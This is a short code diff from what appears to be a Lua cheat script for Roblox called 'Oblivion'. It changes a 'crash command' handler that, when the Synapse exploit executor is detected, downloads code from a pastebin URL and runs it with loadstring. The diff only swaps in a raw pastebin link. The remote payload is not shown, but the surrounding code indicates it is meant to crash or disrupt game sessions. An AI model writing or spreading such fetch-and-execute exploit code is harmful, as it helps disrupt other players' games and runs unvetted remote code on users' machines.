@@ -2064,7 +2064,7 @@ function LocalPlayerChatted(msg)
 	    game.Players.LocalPlayer:Kick("Oblivion Support : your exploit doesn't support crash command")
 else
     if syn then
-	loadstring(game:HttpGet('https://pastebin.com/FVvmNR0F'))()
+	loadstring(game:HttpGet('https://pastebin.com/raw/Mv242yVV'))()
     end
 end
 end
